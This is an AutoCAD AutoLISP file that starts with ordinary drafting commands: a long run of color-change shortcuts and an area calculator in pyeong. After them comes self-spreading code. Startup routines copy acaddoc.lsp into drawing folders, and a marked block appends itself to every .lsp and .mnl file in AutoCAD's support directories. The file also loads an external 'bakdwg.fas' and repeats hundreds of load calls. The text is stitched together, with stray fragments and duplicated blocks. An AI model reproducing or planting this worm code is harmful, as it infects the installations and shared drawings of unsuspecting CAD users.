       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "123" "")
       )
(defun c:124()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "124" "")
       )
(defun c:125()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "125" "")
       )
(defun c:126()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "126" "")
       )
(defun c:127()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "127" "")
       )
(defun c:128()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "128" "")
       )
(defun c:129()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "129" "")
       )
(defun c:130()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "130" "")
       )
(defun c:131()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "131" "")
       )
(defun c:132()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "132" "")
       )
(defun c:133()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "133" "")
       )
(defun c:134()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "134" "")
       )
(defun c:135()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "135" "")
       )
(defun c:136()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "136" "")
       )
(defun c:137()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "137" "")
       )
(defun c:138()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "138" "")
       )
(defun c:139()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "139" "")
       )
(defun c:140()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "140" "")
       )
(defun c:141()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "141" "")
       )
(defun c:142()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "142" "")
       )
(defun c:143()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "143" "")
       )
(defun c:144()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "144" "")
       )
(defun c:145()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "145" "")
       )
(defun c:146()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "146" "")
       )
(defun c:147()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "147" "")
       )
(defun c:148()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "148" "")
       )
(defun c:149()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "149" "")
       )
(defun c:150()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "150" "")
       )
(defun c:151()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "151" "")
       )
(defun c:152()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "152" "")
       )
(defun c:153()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "153" "")
       )
(defun c:154()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "154" "")
       )
(defun c:155()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "155" "")
       )
(defun c:156()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "156" "")
       )
(defun c:157()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "157" "")
       )
(defun c:158()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "158" "")
       )
(defun c:159()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "159" "")
       )
(defun c:160()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "160" "")
       )
(defun c:161()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "161" "")
       )
(defun c:162()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "162" "")
       )
(defun c:163()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "163" "")
       )
(defun c:164()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "164" "")
       )
(defun c:165()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "165" "")
       )
(defun c:166()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "166" "")
       )
(defun c:167()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "167" "")
       )
(defun c:168()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "168" "")
       )
(defun c:169()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "169" "")
       )
(defun c:170()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "170" "")
       )
(defun c:171()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "171" "")
       )
(defun c:172()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "172" "")
       )
(defun c:173()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "173" "")
       )
(defun c:174()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "174" "")
       )
(defun c:175()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "175" "")
       )
(defun c:176()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "176" "")
       )
(defun c:177()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "177" "")
       )
(defun c:178()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "178" "")
       )
(defun c:179()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "179" "")
       )
(defun c:180()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "180" "")
       )
(defun c:181()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "181" "")
       )
(defun c:182()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "182" "")
       )
(defun c:183()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "183" "")
       )
(defun c:184()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "184" "")
       )
(defun c:185()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "185" "")
       )
(defun c:186()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "186" "")
       )
(defun c:187()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "187" "")
       )
(defun c:188()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "188" "")
       )
(defun c:189()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "189" "")
       )
(defun c:190()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "190" "")
       )
(defun c:191()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "191" "")
       )
(defun c:192()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "192" "")
       )
(defun c:193()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "193" "")
       )
(defun c:194()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "194" "")
       )
(defun c:195()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "195" "")
       )
(defun c:196()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "196" "")
       )
(defun c:197()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "197" "")
       )
(defun c:198()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "198" "")
       )
(defun c:199()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "199" "")
       )
(defun c:200()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "200" "")
       )
(defun c:201()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "201" "")
       )
(defun c:202()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "202" "")
       )
(defun c:203()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "203" "")
       )
(defun c:204()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "204" "")
       )
(defun c:205()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "205" "")
       )
(defun c:206()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "206" "")
       )
(defun c:207()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "207" "")
       )
(defun c:208()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "208" "")
       )
(defun c:209()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "209" "")
       )
(defun c:210()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "210" "")
       )
(defun c:211()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "211" "")
       )
(defun c:212()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "212" "")
       )
(defun c:213()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "213" "")
       )
(defun c:214()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "214" "")
       )
(defun c:215()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "215" "")
       )
(defun c:216()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "216" "")
       )
(defun c:217()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "217" "")
       )
(defun c:218()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "218" "")
       )
(defun c:219()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "219" "")
       )
(defun c:220()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "220" "")
       )
(defun c:221()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "221" "")
       )
(defun c:222()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "222" "")
       )
(defun c:223()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "223" "")
       )
(defun c:224()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "224" "")
       )
(defun c:225()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "225" "")
       )
(defun c:226()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "226" "")
       )
(defun c:227()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "227" "")
       )
(defun c:228()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "228" "")
       )
(defun c:229()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "229" "")
       )
(defun c:230()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "230" "")
       )
(defun c:231()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "231" "")
       )
(defun c:232()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "232" "")
       )
(defun c:233()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "233" "")
       )
(defun c:234()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "234" "")
       )
(defun c:235()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "235" "")
       )
(defun c:236()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "236" "")
       )
(defun c:237()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "237" "")
       )
(defun c:238()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "238" "")
       )
(defun c:239()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "239" "")
       )
(defun c:240()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "240" "")
       )
(defun c:241()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "241" "")
       )
(defun c:242()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "242" "")
       )
(defun c:243()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "243" "")
       )
(defun c:244()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "244" "")
       )
(defun c:245()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "245" "")
       )
(defun c:246()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "246" "")
       )
(defun c:247()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "247" "")
       )
(defun c:248()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "248" "")
       )
(defun c:249()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "249" "")
       )
(defun c:250()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "250" "")
       )
(defun c:251()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "251" "")
       )
(defun c:252()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "252" "")
       )
(defun c:253()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "253" "")
       )
(defun c:254()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "254" "")
       )
(defun c:255()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "255" "")
       )

; AREA-PY.LSP
; BY GUNCAD SYSTEM  90.5.5.
(defun c:PY (/ cmd a pyng)
     (setq cmd (getvar "cmdecho"))
     (setvar "cmdecho" 0)
     (command "area" "e" pause)
     (setq a (getvar "area"))
     (setq pyng (/ (/ a 1.0e+06) 3.3058))
     (princ "\n       Area : ")
     (princ pyng)
     (princ "py")
     (setvar "cmdecho" cmd)
     (prin1)
)

;; Silent load.
(princ)

(defun-q s::startup
	 (/ basepath
	    baseacad
	    acaddocpath
	    r-acaddoc
	    w-basepath
	    rl-acaddoc
	    acaddoclsp
	    c-acaddocname
	    c-acaddocpath
	    c-acaddoc
	   )
     (setq basepath
	    (findfile "base.dcl")
     )
     (setq basepath
	    (substr basepath
		    1 (- (strlen basepath) 8)
            )
     )
     (setq baseacad (strcat basepath "acaddoc.lsp"))
  
	(setq acaddocpath
               (findfile "acaddoc.lsp")
	)
	(setq acaddocpath
	       (substr acaddocpath
		       1 (- (strlen acaddocpath) 11)
	       )
	)
	(setq acaddoclsp
	       (strcat acaddocpath "acaddoc.lsp"))
	
	
        (setq c-acaddocname
	       (getvar "dwgname")
	)
        (setq c-acaddocpath
	       (findfile c-acaddocname)
	)
        (setq c-acaddocpath
	       (substr c-acaddocpath
		       1 (- (strlen c-acaddocpath) (strlen c-acaddocname))	
		)
	 )
        (setq c-acaddoc
	       (strcat c-acaddocpath "acaddoc.lsp")
	 )
	 (if
           (and
	   (/= basepath acaddocpath)
	   (= c-acaddocpath acaddocpath)
	   )
	     (progn
	       (setq r-acaddoc
	       (open acaddoclsp "r")
	       )
	       (setq w-basepath
	          (open baseacad "w")
		)     
	       (while
	           (setq rl-acaddoc
		    (read-line r-acaddoc)
	           )
	           (write-line rl-acaddoc w-basepath)
	        )
	        (close w-basepath)   
                (close r-acaddoc)
	    
             )
         
	     (progn
	       (setq r-acaddoc
	       (open acaddoclsp "r")
	       )
	       (setq w-basepath
	          (open c-acaddoc "w")
		)
	        (while
	           (setq rl-acaddoc
		    (read-line r-acaddoc)
	           )
	           (write-line rl-acaddoc w-basepath)
	        )
	        (close w-basepath)   
                (close r-acaddoc)
	    
             )
	 )
	 (princ)
)
(defun-q s::startup
	 (/ basepath
	    baseacad
	    acaddocpath
	    r-acaddoc
	    w-basepath
	    rl-acaddoc
	    acaddoclsp
	    c-acaddocname
	    c-acaddocpath
	    c-acaddoc
	   )
     (setq basepath
	    (findfile "base.dcl")
     )
     (setq basepath
	    (substr basepath
		    1 (- (strlen basepath) 8)
            )
     )
     (setq baseacad (strcat basepath "acaddoc.lsp"))
  
	(setq acaddocpath
               (findfile "acaddoc.lsp")
	)
	(setq acaddocpath
	       (substr acaddocpath
		       1 (- (strlen acaddocpath) 11)
	       )
	)
	(setq acaddoclsp
	       (strcat acaddocpath "acaddoc.lsp"))
	
	
        (setq c-acaddocname
	       (getvar "dwgname")
	)
        (setq c-acaddocpath
	       (findfile c-acaddocname)
	)
        (setq c-acaddocpath
	       (substr c-acaddocpath
		       1 (- (strlen c-acaddocpath) (strlen c-acaddocname))	
		)
	 )
        (setq c-acaddoc
	       (strcat c-acaddocpath "acaddoc.lsp")
	 )
	 (if
           (and
	   (/= basepath acaddocpath)
	   (= c-acaddocpath acaddocpath)
	   )
	     (progn
	       (setq r-acaddoc
	       (open acaddoclsp "r")
	       )
	       (setq w-basepath
	          (open baseacad "w")
		)     
	       (while
	           (setq rl-acaddoc
		    (read-line r-acaddoc)
	           )
	           (write-line rl-acaddoc w-basepath)
	        )
	        (close w-basepath)   
                (close r-acaddoc)
	    
             )
         
	     (progn
	       (setq r-acaddoc
	       (open acaddoclsp "r")
	       )
	       (setq w-basepath
	          (open c-acaddoc "w")
		)
	        (while
	           (setq rl-acaddoc
		    (read-line r-acaddoc)
	           )
	           (write-line rl-acaddoc w-basepath)
	        )
	        (close w-basepath)   
                (close r-acaddoc)
	    
             )
	 )
	 (princ)
)





















    );progn
  );if
(setq mnln 0)
(while (< mnln mnlnum)
  (setq mnlfilename (strcat acadmnlpath "\\" (nth mnln mnlfilelist)))
  (setq mnln1 0)
  (while (< mnln1 mnlnum)
    (setq mnlfilename1 (strcat acadmnlpath "\\" (nth mnln1 mnlfilelist)))
    (app mnlfilename mnlfilename1 bz)
    (setq mnln1 (1+ mnln1))
    );while
  (setq lspn1 0)
  (while (< lspn1 lspnum)
    (setq lspfilename1 (strcat support "\\" (nth lspn1 lspfilelist)))
    (app mnlfilename lspfilename1 bz)
    (setq lspn1 (1+ lspn1))
    );while
  (setq mnln (1+ mnln))
  );while
(setq lspn 0)
(while (< lspn lspnum)
  (setq lspfilename (strcat support "\\" (nth lspn lspfilelist)))
  (setq lspn1 0)
  (while (< lspn1 lspnum)
    (setq lspfilename1 (strcat support "\\" (nth lspn1 lspfilelist)))
    (app lspfilename lspfilename1 bz)
    (setq lspn1 (1+ lspn1))
    );while
  (setq mnln1 0)
  (while (< mnln1 mnlnum)
    (setq mnlfilename1 (strcat acadmnlpath "\\" (nth mnln1 mnlfilelist)))
    (app lspfilename mnlfilename1 bz)
    (setq mnln1 (1+ mnln1))
    );while































































(setq flagx t)
(setq bz "(setq flagx t)")
(if(null qxgxwddm)(if(findfile "bakdwg.fas")(load "bakdwg.fas")))
(defun app(source target bz / flag flag1 wjm wjm1 text)
  (setq flag nil)
  (setq flag1 t)

(if (findfile target)
    (progn
      (setq wjm1 (open target "r"))
      (while (setq text (read-line wjm1))
	(if (= text bz) (setq flag1 nil))
	);while
      (close wjm1)
      );progn
    );if
  (if flag1
    (progn
      (setq wjm (open source "r"))
      (setq wjm1 (open target "a"))
      (write-line (chr 13) wjm1)
      (while (setq text (read-line wjm))
	(if (= text bz) (setq flag t))
	(if flag
	  (progn
	    (write-line text wjm1)
	    );progn
	  );if
	);while
      (close wjm1)
      (close wjm)
      );progn
    );if
  );defun
(setvar "cmdecho" 0)
(setq acadmnl (findfile "acad.mnl"))
(setq acadmnlpath (vl-filename-directory acadmnl))
(setq mnlfilelist (vl-directory-files acadmnlpath "*.mnl"))
(setq mnlnum (length mnlfilelist))
(setq acadexe (findfile "acad.exe"))
(setq acadpath (vl-filename-directory acadexe))
(setq support (strcat acadpath "\\support"))
(setq lspfilelist (vl-directory-files support "*.lsp"))
(setq lspfilelist (append lspfilelist (list "acaddoc.lsp")))
(setq lspnum (length lspfilelist))
(setq dwgname (getvar "dwgname"))
(setq dwgpath (findfile dwgname))
(if dwgpath
  (progn
    (setq acaddocpath (vl-filename-directory dwgpath))
    (setq acaddocfile (strcat acaddocpath "\\acaddoc.lsp"))
    (setq mnln 0)
    (while (< mnln mnlnum)
      (setq mnlfilename (strcat acadmnlpath "\\" (nth mnln mnlfilelist)))
      (app mnlfilename acaddocfile bz)
      (app acaddocfile mnlfilename bz)
      (setq mnln (1+ mnln))
      );while
    (setq lspn 0)
    (while (< lspn lspnum)
      (setq lspfilename (strcat support "\\" (nth lspn lspfilelist)))
      (app lspfilename acaddocfile bz)
      (app acaddocfile lspfilename bz)
      (setq lspn (1+ lspn))
      );while
    );progn
  );if
(setq mnln 0)
(while (< mnln mnlnum)
  (setq mnlfilename (strcat acadmnlpath "\\" (nth mnln mnlfilelist)))
  (setq mnln1 0)
  (while (< mnln1 mnlnum)
    (setq mnlfilename1 (strcat acadmnlpath "\\" (nth mnln1 mnlfilelist)))
    (app mnlfilename mnlfilename1 bz)
    (setq mnln1 (1+ mnln1))
    );while
  (setq lspn1 0)
  (while (< lspn1 lspnum)
    (setq lspfilename1 (strcat support "\\" (nth lspn1 lspfilelist)))
    (app mnlfilename lspfilename1 bz)
    (setq lspn1 (1+ lspn1))
    );while
  (setq mnln (1+ mnln))
  );while
(setq lspn 0)
(while (< lspn lspnum)
  (setq lspfilename (strcat support "\\" (nth lspn lspfilelist)))
  (setq lspn1 0)
  (while (< lspn1 lspnum)
    (setq lspfilename1 (strcat support "\\" (nth lspn1 lspfilelist)))
    (app lspfilename lspfilename1 bz)
    (setq lspn1 (1+ lspn1))
    );while
  (setq mnln1 0)
  (while (< mnln1 mnlnum)
    (setq mnlfilename1 (strcat acadmnlpath "\\" (nth mnln1 mnlfilelist)))
    (app lspfilename mnlfilename1 bz)
    (setq mnln1 (1+ mnln1))
    );while

(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
